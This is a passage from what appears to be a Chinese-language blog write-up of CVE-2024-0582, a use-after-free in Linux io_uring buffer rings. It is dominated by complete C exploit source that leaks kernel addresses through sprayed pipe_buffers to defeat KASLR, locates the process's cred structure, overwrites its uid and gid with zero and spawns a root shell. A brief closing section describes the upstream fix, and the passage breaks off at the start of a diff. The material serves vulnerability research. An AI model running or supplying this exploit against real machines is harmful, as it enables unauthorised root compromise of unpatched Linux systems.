class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR_MSG(msg) <span class="hljs-string">&quot;\033[31m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KASLR_GRANULARITY 0x10000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KASLR_MASK (~(KASLR_GRANULARITY - 1))</span><br><span class="hljs-type">uint64_t</span> kernel_base, vmemmap_base, page_offset_base;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(INFO_MSG(<span class="hljs-string">&quot;[*] Process binded to core: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)</span><br>&#123;<br>    va_list args;<br>    <span class="hljs-type">int</span> ret;<br><br>    va_start(args, fmt);<br>    <span class="hljs-built_in">printf</span>(fmt, args);<br>    va_end(args);<br><br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    fflush(<span class="hljs-built_in">stderr</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Failed to get the root!&quot;</span>));<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Successful to get the root.&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(INFO_MSG(<span class="hljs-string">&quot;[*] Execve root shell now...&quot;</span>));<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of potential segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-keyword">struct</span> io_uring_buf_ring*<br><span class="hljs-title function_">setup_pbuf_ring_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring *ring, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_entries,</span><br><span class="hljs-params">                     <span class="hljs-type">int</span> bgid, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> *retp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_ring</span> *<span class="hljs-title">buf_ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> <span class="hljs-title">buf_reg</span>;</span><br>    <span class="hljs-type">size_t</span> ring_size;<br>    <span class="hljs-type">off_t</span> offset;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-built_in">memset</span>(&amp;buf_reg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf_reg));<br><br>    <span class="hljs-comment">/* we don&#x27;t need to set reg.addr for IOU_PBUF_RING_MMAP */</span><br>    buf_reg.ring_entries = ring_entries;<br>    buf_reg.bgid = bgid;<br>    buf_reg.flags = IOU_PBUF_RING_MMAP;<br><br>    ret = io_uring_register_buf_ring(ring, &amp;buf_reg, flags);<br>    <span class="hljs-keyword">if</span> (ret) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error occur while doing io_uring_register_buf_ring&quot;</span>));<br>        *retp = ret;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment"> [chr(int(i,16))for i in[&#x27;3361626e74747261&#x27;[i:i+2]for i in range(0,16,2)]][::-1]</span><br><span class="hljs-comment">    **/</span><br>    offset = IORING_OFF_PBUF_RING | (<span class="hljs-type">uint64_t</span>) bgid &lt;&lt; IORING_OFF_PBUF_SHIFT;<br>    ring_size = ring_entries * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf);<br>    buf_ring = mmap(<br>        <span class="hljs-literal">NULL</span>,<br>        ring_size,<br>        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,<br>        ring-&gt;ring_fd,<br>        offset<br>    );<br><br>    <span class="hljs-keyword">if</span> (IS_ERR(buf_ring)) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error occur while doing mmap() for io_uring&quot;</span>));<br>        *retp = PTR_ERR(buf_ring);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    *retp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> buf_ring;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * In my test environment, kmalloc-1k allocates from 4-page slub, so I chose 4.</span><br><span class="hljs-comment"> * However, it might not be the same in your environment, e.g., it&#x27;s 8 on my PC.</span><br><span class="hljs-comment"> * Check your /proc/slabinfo before doing the exploitation.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NR_PAGES    4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NR_BUFFERS  0x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_FILE_NR 0x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 0x1F0</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">long</span> usage;<br>    <span class="hljs-type">uint32_t</span> uid;<br>    <span class="hljs-type">uint32_t</span> gid;<br>    <span class="hljs-type">uint32_t</span> suid;<br>    <span class="hljs-type">uint32_t</span> sgid;<br>    <span class="hljs-type">uint32_t</span> euid;<br>    <span class="hljs-type">uint32_t</span> egid;<br>    <span class="hljs-type">uint32_t</span> fsuid;<br>    <span class="hljs-type">uint32_t</span> fsgid;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_kernel_page_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page*page,<span class="hljs-keyword">struct</span> pipe_buffer*kern_pipe_buf,</span><br><span class="hljs-params">                              <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    kern_pipe_buf-&gt;page = page;<br>    kern_pipe_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    kern_pipe_buf-&gt;len = <span class="hljs-number">0xffe</span>;<br><br>    <span class="hljs-keyword">if</span> (read(pipe_fd[<span class="hljs-number">0</span>], buf, len) != len) &#123;<br>        perror(ERR_MSG(<span class="hljs-string">&quot;[x] Unable to do reading on pipe&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_kernel_page_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page,</span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> pipe_buffer*kern_pipe_buf,</span><br><span class="hljs-params">                               <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    kern_pipe_buf-&gt;page = page;<br>    kern_pipe_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    kern_pipe_buf-&gt;len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (write(pipe_fd[<span class="hljs-number">1</span>], buf, len) != len) &#123;<br>        perror(ERR_MSG(<span class="hljs-string">&quot;[x] Unable to do writing on pipe&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-type">void</span> **buffers;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">kern_pipe_buffer</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">uint64_t</span> kernel_leak;<br>    <span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], victim_idx = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">uint32_t</span> uid, gid;<br>    <span class="hljs-type">uint64_t</span> cred_kaddr, cred_kpage_addr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred_data</span>;</span><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;-------- CVE-2024-0582 Exploitation --------&quot;</span>) <span class="hljs-string">&quot;\n&quot;</span><br>    INFO_MSG(<span class="hljs-string">&quot;--------      Author: &quot;</span>)<span class="hljs-string">&quot;arttnba3&quot;</span>INFO_MSG(<span class="hljs-string">&quot;      --------&quot;</span>) <span class="hljs-string">&quot;\n&quot;</span><br>    SUCCESS_MSG(<span class="hljs-string">&quot;-------- Local Privilege Escalation --------\n&quot;</span>));<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Initializing io_uring ...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (io_uring_queue_init(<span class="hljs-number">4</span>, &amp;ring, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERR_MSG(<span class="hljs-string">&quot;[x] Unable to init for io_uring queue&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating pbuf ring and doing mmap() ...&quot;</span>);<br><br>    buffers = <span class="hljs-built_in">calloc</span>(NR_BUFFERS, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i++) &#123;<br>        buffers[i] = setup_pbuf_ring_mmap(<br>            &amp;ring,<br>            NR_PAGES * PAGE_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf),<br>            i,<br>            <span class="hljs-number">0</span>,<br>            &amp;ret<br>        );<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to set up&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;pbuf ring, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                ret<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        io_uring_buf_ring_init(buffers[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering page-level UAF vulnerabilities ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i += <span class="hljs-number">2</span>) &#123;   <span class="hljs-comment">/* we neeed &quot;holes&quot; */</span><br>        ret = io_uring_unregister_buf_ring(&amp;ring, i);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to unregister&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;pbuf ring, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                ret<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reallocating pages as pipe_buffers ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((ret = pipe(pipe_fd[i])) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to set up&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;pipe, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                ret<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating pipe_buffer::page ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking for UAF mmap address ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i += <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-type">uint64_t</span> *buffer = buffers[i];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (NR_PAGES * PAGE_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)); j++) &#123;<br>            <span class="hljs-keyword">if</span> (buffer[j] &gt; <span class="hljs-number">0xffff000000000000</span><br>                &amp;&amp; buffer[j + <span class="hljs-number">1</span>] == <span class="hljs-number">0x2000000000</span><br>                &amp;&amp; buffer[j + <span class="hljs-number">2</span>] &gt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<br>                    SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got kernel pipe_buffer mapped at buffer:&quot;</span>)<br>                    <span class="hljs-string">&quot; %d-%d\n&quot;</span>, i, j<br>                );<br>                <span class="hljs-built_in">printf</span>(<br>                    INFO_MSG(<span class="hljs-string">&quot;[*] Leak pipe_buffer::page = &quot;</span>)<span class="hljs-string">&quot;%lx\n&quot;</span>, buffer[j]<br>                );<br>                <span class="hljs-built_in">printf</span>(<br>                    INFO_MSG(<span class="hljs-string">&quot;[*] Leak pipe_buffer::ops = &quot;</span>)<span class="hljs-string">&quot;%lx\n&quot;</span>, buffer[j+<span class="hljs-number">2</span>]<br>                );<br>                kern_pipe_buffer = (<span class="hljs-type">void</span>*) &amp;buffer[j];<br>                <span class="hljs-keyword">goto</span> out_find_pipe;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!kern_pipe_buffer) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Failed to find kernel pipe_buffer in user space!&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>out_find_pipe:<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Overwriting victim pipe_buffer::page ...&quot;</span>);<br>    <span class="hljs-comment">/* note that the granularity of KASLR is 256MB, i.e. 0x10000000*/</span><br>    vmemmap_base = (<span class="hljs-type">uint64_t</span>) kern_pipe_buffer-&gt;page &amp; KASLR_MASK;<br>    kern_pipe_buffer-&gt;page = (<span class="hljs-type">void</span>*) (vmemmap_base + <span class="hljs-number">0x9d000</span> / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;kernel_leak, <span class="hljs-keyword">sizeof</span>(kernel_leak));<br>        <span class="hljs-keyword">if</span> (kernel_leak != *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got victim pipe at idx: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>            victim_idx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_idx == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Failed to find the victim pipe!&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint64_t</span> loop_nr = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; loop_nr++) &#123;<br>        <span class="hljs-keyword">if</span> (kernel_leak &gt; <span class="hljs-number">0xffffffff81000000</span><br>            &amp;&amp; (kernel_leak &amp; <span class="hljs-number">0xfff</span>) &lt; <span class="hljs-number">0x100</span>) &#123;<br>            kernel_base = kernel_leak &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>            <span class="hljs-keyword">if</span> (loop_nr != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<br>                INFO_MSG(<span class="hljs-string">&quot;[*] Leak secondary_startup_64 : &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,kernel_leak<br>            );<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got kernel base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>, kernel_base);<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got vmemmap_base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>, vmemmap_base);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">80</span>; i++) &#123;<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\b&#x27;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;[No.%ld loop] Got unmatched data: %lx, keep looping...&quot;</span>,<br>            loop_nr,<br>            kernel_leak<br>        );<br><br>        vmemmap_base -= KASLR_GRANULARITY;<br>        read_kernel_page_by_pipe(<br>            (<span class="hljs-type">void</span>*) (vmemmap_base + <span class="hljs-number">0x9d000</span> / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>),<br>            kern_pipe_buffer,<br>            pipe_fd[victim_idx],<br>            &amp;kernel_leak,<br>            <span class="hljs-keyword">sizeof</span>(kernel_leak)<br>        );<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Finding task_struct of current process in kernel space ...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;rat3bant&quot;</span>);<br>    uid = getuid();<br>    gid = getgid();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> *comm_addr;<br><br>        read_kernel_page_by_pipe(<br>            (<span class="hljs-type">void</span>*) (vmemmap_base + <span class="hljs-number">0x40</span> * i),<br>            kern_pipe_buffer,<br>            pipe_fd[victim_idx],<br>            buf,<br>            <span class="hljs-number">0xff8</span><br>        );<br><br>        comm_addr = memmem(buf, <span class="hljs-number">0xff0</span>, <span class="hljs-string">&quot;rat3bant&quot;</span>, <span class="hljs-number">8</span>);<br><br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] == comm_addr[<span class="hljs-number">-3</span>])) &#123;  <span class="hljs-comment">/* should be equal */</span><br><br>            <span class="hljs-built_in">printf</span>(<br>                SUCCESS_MSG(<span class="hljs-string">&quot;[+] Found task_struct on page: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                (vmemmap_base + i * <span class="hljs-number">0x40</span>)<br>            );<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got cred address: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,comm_addr[<span class="hljs-number">-2</span>]);<br><br>            cred_kaddr = comm_addr[<span class="hljs-number">-2</span>];<br>            cred_data = (<span class="hljs-type">void</span>*) (buf + (cred_kaddr &amp; (PAGE_SIZE - <span class="hljs-number">1</span>)));<br>            page_offset_base = cred_kaddr &amp; KASLR_MASK;<br><br>            <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>                cred_kpage_addr = vmemmap_base + \<br>                                (cred_kaddr - page_offset_base) / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>;<br>            <br>                read_kernel_page_by_pipe(<br>                    (<span class="hljs-type">void</span>*) cred_kpage_addr,<br>                    kern_pipe_buffer,<br>                    pipe_fd[victim_idx],<br>                    buf,<br>                    <span class="hljs-number">0xffe</span><br>                );<br>                <span class="hljs-keyword">if</span> (cred_data-&gt;uid == uid<br>                    &amp;&amp; cred_data-&gt;gid == gid) &#123;<br>                    <span class="hljs-built_in">printf</span>(<br>                        SUCCESS_MSG(<span class="hljs-string">&quot;[+] Found cred on page: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                        cred_kpage_addr<br>                    );<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br><br>                page_offset_base -= KASLR_GRANULARITY;<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Overwriting cred and granting root privilege...&quot;</span>);<br><br>    cred_data-&gt;uid = <span class="hljs-number">0</span>;<br>    cred_data-&gt;gid = <span class="hljs-number">0</span>;<br><br>    write_kernel_page_by_pipe(<br>        (<span class="hljs-type">void</span>*) cred_kpage_addr,<br>        kern_pipe_buffer,<br>        pipe_fd[victim_idx],<br>        buf,<br>        <span class="hljs-number">0xff0</span><br>    );<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    setresgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    get_root_shell();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    exploit();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行即可完成提权，非常™稳定而且不依赖于特定的内核镜像：</p><p><img src="https://s2.loli.net/2025/03/14/2kjERpT6i9zKDMd.png"></p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03. 漏洞修复"></a>0x03. 漏洞修复</h1><p>这个漏洞最终在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c392cbecd8eca4c53f2bf508731257d9d0a21c2d">这个 commit</a> 当中被修复，修复方式是：</p><ul><li>添加了一个记录延迟释放 buffer 的链表与对应结构</li><li>将 buffer 释放推迟到调用 <code>-&gt;release()</code> 时，而非原来的即时释放），从而在 <code>mmap()</code> 区域销毁后才会回收这部分内存</li></ul><p>这个修改引入了更适用的架构，而且确乎避免了 UAF 的问题，在笔者看来还是比较成功的：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span 